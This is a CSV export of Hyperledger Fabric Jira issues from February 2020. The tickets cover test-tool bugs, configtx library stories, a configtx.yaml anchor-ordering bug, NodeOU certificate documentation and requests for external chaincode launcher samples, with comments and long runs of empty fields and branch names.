_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Feb/20 1:39 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/83]

 

Add event validation for each transaction;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE not able to send transactions to multiple org peers when endorsement policy is set to have more than 1 ,FAB-17465,44230,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,suryalnvs,suryalnvs,04/Feb/20 12:41 AM,28/Feb/20 3:46 AM,28/Oct/23 3:09 AM,07/Feb/20 1:23 AM,v2.0.0,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,quality,,,,,"PTE not able to send transactions to multiple org peers when endorsement policy is set to have more than 1. As connection profile may be specific to only organization, PTE may only be able to send to organization that connection profile has.",,dongming,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb13",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,suryalnvs,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Feb/20 12:59 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/80];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to generate create channel transaction from parameters,FAB-17466,44233,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,04/Feb/20 3:04 AM,17/Mar/20 4:25 AM,28/Oct/23 3:09 AM,28/Feb/20 12:45 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,configtx,ipm,,,,"As a fabric administrator, I want to use a fit-for-purpose library to generate a channel creation transaction from input data structures. This library should not make assumptions about how any key material is stored and should not require network access.

Acceptance:

Calling a function similar to what we have below returns a proto-encoded genesis block that roughly matches that produced by {{configtxgen -channelID channel-id -profile profile-name ...}} using a prototypical {{configtx.yaml}} from our integration test suite.

Generating a genesis block from the configtx.yaml and an msp folder, and using code implemented in this story, I should get two `proto.Equal` blocks.

{code}
type Profile struct {
	Consortium   string
	Application  *Application
	Orderer      *Orderer
	Consortiums  map[string]*Consortium
	Capabilities map[string]bool
	Policies     map[string]*Policy
}

...

type Option func(options)

// Options for extensibility
type options struct {}

func CreateChannelTx(channelSpec ChannelConfig, options ...Option) (*cb.Block, error) {
  // Implement me
}
{code}

The types that are listed above come from the {{genesisconfig}} package in fabric and appear to be managed through a combination of viper and yaml processing. We do not want to use these packages directly; we want to copy and adapt the necessary structures into our package.",,sykesm,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znq",,,,Unset,Unset,,(Please add steps to reproduce),5.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Feb/20 11:59 PM;tsharris;[https://github.com/hyperledger/fabric/pull/686];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to create a detached signature for a ChannelUpdate,FAB-17467,44234,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,sykesm,sykesm,04/Feb/20 3:20 AM,17/Mar/20 4:26 AM,28/Oct/23 3:09 AM,27/Feb/20 1:35 AM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,configtx,ipm,,,,"As a fabric admin, I wish to sign a {{ChannelUpdate}} transaction and generate a detached signature. The key material used to sign the transaction should be one of the input parameters and should not be derived from configuration.

Acceptance:

Calling the new function with appropriate arguments generates a detached signature that I can use later as one of the _n_ required signatures when assembling the configuration update transaction.",,caod,dereckluo,Senthil1,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqi",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,Senthil1,sykesm,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Feb/20 5:27 AM;dereckluo;https://github.com/hyperledger/fabric/pull/669;;;","20/Feb/20 1:22 PM;Senthil1;Why are we marking it as a story? I wanted to understand the overall story (due to some PRs) but couldn't find all the tasks under a single story (difficult to understand the overall agenda to review the code).;;;","21/Feb/20 2:49 AM;caod;[~Senthil1] see [https://jira.hyperledger.org/secure/RapidBoard.jspa?rapidView=219&view=planning&selectedIssue=FAB-17467&issueLimit=100] IPM backlog for a list of the stories. There's no epic or label that groups these but we can add one.;;;","21/Feb/20 2:52 AM;caod;Created a new `configtx` label for filtering issues;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to attach signatures to a configuration update transaction,FAB-17468,44235,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,sykesm,sykesm,04/Feb/20 3:22 AM,17/Mar/20 4:22 AM,28/Oct/23 3:09 AM,28/Feb/20 12:45 AM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,configtx,ipm,,,,"As a fabric admin, I want to take a {{ConfigUpdate}} transaction and a collection of detached signatures and use them to create a complete, signed channel config update transaction that can be validated by the orderer and the peers.

Acceptance:

The generated configuration transaction should be equivalent to one generated by ""building up"" signatures in order using the existing `signtx` command on the peer.",,dereckluo,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqr",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Feb/20 6:49 AM;dereckluo;https://github.com/hyperledger/fabric/pull/696;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement orderer configuration transaction that can update batch parameters,FAB-17469,44236,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,sykesm,sykesm,04/Feb/20 3:24 AM,17/Mar/20 4:24 AM,28/Oct/23 3:09 AM,28/Feb/20 12:45 AM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,configtx,ipm,,,,"As a fabric administrator, I want to use a fit-for-purpose library to generate a channel update transaction that modifies the {{max_message_count}} batch size parameter. The channel update transaction that is generated should not be signed.

Acceptance

Calling the new function with appropriate arguments should generate a config update transaction that matches one produced by manually transforming and generating a configuration update using the existing tools (ignoring any signature that may be applied by the existing tools).",,caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqw",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Feb/20 2:40 AM;caod;[https://github.com/hyperledger/fabric/pull/702];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stop building Fabric-CA binaries and docker images ,FAB-17470,44237,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,04/Feb/20 3:37 AM,16/Apr/20 11:52 AM,28/Oct/23 3:09 AM,16/Apr/20 11:52 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"As part of the image clone and repo setup before all of our tests, we also build fabric-ca docker images (even though we just downloaded them) and binaries. Investigate why we do this and if necessary we can publish additional artifacts to Artifactory if there is a need so we can remove this step from the process.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018pv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
incorrect OrdererType for certain Profiles in sampleconfig/configtx.yaml,FAB-17471,44256,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nao,xlswirlds,xlswirlds,04/Feb/20 8:04 AM,29/May/20 9:58 PM,28/Oct/23 3:09 AM,29/May/20 9:58 PM,v2.0.0,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,help-wanted,,,,,"For two Kafka profiles, the OrdererType key-value appears before pulling the default of ""solo"" from OrdererDefaults, so it's overwritten.

file: sampleconfig/configtx.yaml, e.g.: 
{code:java}
# SampleInsecureKafka defines a configuration that differs from the
# SampleInsecureSolo one only in that it uses the Kafka-based orderer.
SampleInsecureKafka:
  <<: *ChannelDefaults
  Orderer:
    OrdererType: kafka
     <<: *OrdererDefaults
    Consortiums:
      SampleConsortium:
        Organizations: {code}",,denyeart,nao,xlswirlds,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018u3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,nao,xlswirlds,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Feb/20 3:53 AM;denyeart;What do you think [~guoger]?;;;","27/May/20 3:47 PM;nao;I tried making genesis block using SampleInsecureKafka profile.
As mentioned by Xin, OrdererDefault overwrites OrdererType

{code:java}
$ configtxgen -outputBlock genesis_block.pb -profile SampleSingleMSPKafka -channelID orderer-system-channel --configPath fabric/sampleconfig 
$ strings genesis_block.pb 
orderer-system-channel*@e6c40cd4d433bff03fff9c45226a9d337ef273a6132de716cf790d80bfca0a25
Orderer         
ConsensusType 
solo
Admins  
....
{code}

If OrdererDefault was called before OrdererType using SampleSingleMSPKafka profile, genesis block was created as intended

{code:java}
$ configtxgen -outputBlock genesis_block.pb -profile SampleSingleMSPKafka -channelID orderer-system-channel --configPath fabric/sampleconfig
$ strings genesis_block.pb                                                                                                               
orderer-system-channel*@6ee218e464778c2a97e3110ecfea4d05066ab6dd5e9c273bba7bd2a7f6bf22a9                                                                          
Orderer 
ConsensusType                                                                                                                                                     
kafka 
Admins  
....
{code}

Do you mind if I take over?
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Node OU configuration can only specify a single CA cert,FAB-17472,44261,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,05/Feb/20 3:31 AM,23/Jan/21 10:22 AM,28/Oct/23 3:09 AM,16/Feb/20 2:47 AM,,,,,,,,,,v1.4.5,v2.1.0,,,fabric-crypto,,,,,,,,,0,,,,,,"Copied from:

https://jira.hyperledger.org/browse/FAB-17059?focusedCommentId=65793&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-65793

Given that the MSP configuration contains a single fabric_node_ous field, adding a CA to an existing MSP might create problems. Indeed, if any of the OU identifiers (client, peer, admin or orderer) sets the certificate field, the client, peer, admin or orderer certificate issued by one of the two CAs will be invalid after the config update. We might want to extend the certificate field to become a slice.

The certificate field in question can be found here:
https://github.com/hyperledger/fabric/blob/release-1.4/sampleconfig/msp/config.yaml#L14

Alternatively, we can clarify the documentation and recommend to only set a Certificate in the NodeOU configuration if you really want a specific certificate to issue NodeOU classifications.",,ales,angelo.decaro,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17059,,,FAB-11245,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018v7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ales,angelo.decaro,denyeart,elli-androulaki,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Feb/20 5:48 PM;angelo.decaro;[~denyeart], would setting *Certificate* to empty be a viable workaround? I say this because you are pointing to a case where both CAs can produce, let's say, *client* certificates. If this is the case then *not* setting *Certificate* is just fine.

Instead, if you consider the following example then making *Certificate* ** a slice seems necessary: There is an MSP with threes CAs *but* **only two of them can issue *client* certificate. 

What do you think?;;;","11/Feb/20 3:25 AM;denyeart;I think the proposal to leave Certificate blank for multi- ca cert support of Node OUs is not ideal. 
It would leave a somewhat awkward story, for example look at the doc at:
https://hyperledger-fabric.readthedocs.io/en/latest/msp.html#organizational-units

It would mean that if configuring OrganizationalUnitIdentifiers, when adding a 2nd CA cert you MUST specify both Certificates (certificate can't be blank).
And if configuring NodeOUs, when adding a 2nd CA cert, you MUST NOT specify a Certificate (certificate can be blank or single entry only).

That being said, I also expect forcing the support for arrays of ca certs in the Node OU section will require a capability change and require ALL users to re-visit their configs when the capability is enabled.  So the pain of a change for all may be reason enough not to add the multi- ca cert support at this time.

But I'll defer to [~ales] and [~angelo.decaro], in case you have another suggestion that I'm missing.;;;","14/Feb/20 10:58 PM;angelo.decaro;I agree, this change will require a new capability. We can just make sure to add support for both configuration types.;;;","15/Feb/20 2:53 AM;denyeart;Discussed further with Angelo and Alessandro. Decision is to improve the documentation and samples to indicate that Certificate can be left blank in scenarios where any of the org's CAs can issue the NodeOU classification.

PR: https://github.com/hyperledger/fabric/pull/672;;;","23/Jan/21 10:16 AM;denyeart;Documentation was updated to indicate that you can leave nodeou Certificate unset in order to allow OUs issued from any of the org's CAs:
{code:java}
Certificate: (Optional) Set this to the path of the CA or intermediate CA certificate under which client (peer, admin or orderer) identities should be validated. The field is relative to the MSP root folder. Only a single Certificate can be specified. If you do not set this field, then the identities are validated under any CA defined in the organization’s MSP configuration, which could be desirable in the future if you need to add other CA or intermediate certificates.{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Operator to run install, instantiate and invokes in parallel when multiple orgs are specified",FAB-17473,44262,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,05/Feb/20 4:15 AM,21/Feb/20 11:44 PM,28/Oct/23 3:09 AM,21/Feb/20 11:44 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Operator to run install, instantiate and invokes in parallel when multiple orgs are specified.

When multiple organizations are passed as shown: `organizations: org1,org2`, operator should pass connection profile directory to PTE for reading all connection profiles and sending invokes using a single run.",,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zf",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Feb/20 4:23 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/82;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create samples for External Chaincode Launchers,FAB-17474,44263,,Task,Backlog,FAB,Fabric,software,denyeart,,,High,,,btl5037,btl5037,05/Feb/20 4:22 AM,26/May/21 8:49 PM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,v2.x,,,,fabric-samples,,,,,,,,,4,,,,,,Since releasing v2.0 we have had many questions about using the new external launcher for chaincode. We should create a couple examples to show how to use the new feature. In particular a simple example using docker without the socket (provide the image and peer will launch it) and a kubernetes example (launch a chaincode pod and connect to it),,btl5037,cmgabriel,mirioeggmann,Pritam 12,Udossohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018vn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,cmgabriel,mirioeggmann,Pritam 12,Udossohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Mar/20 3:41 AM;Udossohn;Hi,

I posted an example of how to set up and use the external chaincode launcher without the docker socket on medium. Maybe this could be used as a starting point.

Here the article goes [Setting Up the External Chaincode Builder and Launcher in Hyperledger Fabric 2.0|[https://medium.com/@robinklemens/setting-up-the-external-chaincode-builder-and-launcher-in-hyperledger-fabric-2-0-b17f43a3d8ed]]

Pau Aragoès Sabaté provided a great kubernetes example in this article [How to implement Hyperledger Fabric External Chaincodes within a Kubernetes cluster|[https://medium.com/swlh/how-to-implement-hyperledger-fabric-external-chaincodes-within-a-kubernetes-cluster-fd01d7544523]]

I hope both article help the community until the official docs covers examples.

Cheers,
Robin;;;","07/Apr/20 11:14 PM;mirioeggmann;We at PostFinance have recently open sourced our external chaincode builder and launcher for Hyperledger Fabric. It talks directly to the Kubernetes API and works without exposing the Docker socket.

The following points have been addressed:
 * Kubernetes security mechanisms can be enforced (network policies, host isolation, etc.)
 * There is no dependency on the Kubernetes CRI implementation (like Docker)
 * There is no need for priviledged pods
 * The chaincode must be usable without changes
 * Chaincode build runs separated from the peer
 * Chaincode is launched separated from the peer
 * The build and launch of chaincode is compatible with the default/internal system
 * stdout and stderr of the chaincode is forwarded to the peer
 * The peer notices when a chaincode fails

Take a look at here if you are interested:
[https://github.com/postfinance/hlfabric-k8scc]

The project is still in development, but works quite well already. We have it running in our test environment.

Best regards;;;","26/May/21 8:49 PM;cmgabriel;This should take on a *higher sense of urgency* with the pending change to Kubernetes in v1.22 that will be a potentially breaking change (reference here: [https://dev.to/stack-labs/how-to-switch-container-runtime-in-a-kubernetes-cluster-1628|https://dev.to/stack-labs/how-to-switch-container-runtime-in-a-kubernetes-cluster-1628)] ) to the Docker-in-Docker (dind) priviledged chaincode containers currently being used by many.  This k8s version is scheduled to be released sometime in the summer of 2021.

Currently there are several good examples as pointed out by Robin and Mirio above, however, they are all based on externally building Go chaincodes and there are not any Node examples out there that I could find. 

Also, the current documented tutorial in the docs which partially utilizes the test-network while very good, does not really reflect a real-world approach to how this would be done in response to upgrading from anyone currently using dind when a potentially breaking change is about hit them.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation style guide,FAB-17475,44264,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,joe-alewine,joe-alewine,05/Feb/20 5:58 AM,25/Feb/20 2:00 AM,28/Oct/23 3:09 AM,25/Feb/20 2:00 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,Create a style guide for writing and editing documentation.,,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jjc",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),joe-alewine,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric-tools 2.0 docker image: wrong path upon loading OrdererClient config,FAB-17476,44266,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Environment Issue,,raulhsj,raulhsj,05/Feb/20 6:34 PM,11/Feb/20 11:20 PM,28/Oct/23 3:09 AM,11/Feb/20 8:50 PM,v2.0.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"*peer lifecycle chaincode approveformyorg* execution entails searching for *orderer.tls.rootcert.file* in a nonexistent path: /opt/gopath/src/*github.cm*/hyperledger/fabric/. This path is not updated upon environment vars so it is sort of ""hardcoded"" in the container",,btl5037,raulhsj,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018w3:",,,,Unset,Unset,,peer lifecycle chaincode approveformyorg --channelID --name --version --sequence --init-required --package-id --ordererTLSHostnameOverride --tls --cafile,,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,raulhsj,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Feb/20 4:44 AM;btl5037;I assume this isn't the actual command you are running, right? There is no fallback when you specify --cafile, it will explicitly tell you you have to provide a command.;;;","06/Feb/20 5:14 AM;btl5037;can you provide the full output of the command you ran;;;","06/Feb/20 6:44 AM;raulhsj;I dropped the values from their respective flags, just to not reveal business params, but yeah, you can assume that all flags are value passed. Regarding the output, let me get to my office tomorrow and I'll see to it (I am located in Spain)

Best regards;;;","06/Feb/20 3:29 PM;raulhsj;Brett, this is the output:

 

2020-02-05 07:39:57.849 UTC [cli.lifecycle.chaincode] setOrdererClient -> INFO 08d Retrieved channel (ustpositivechannel) orderer endpoint: orderer0.ust-positive-network.com:7050
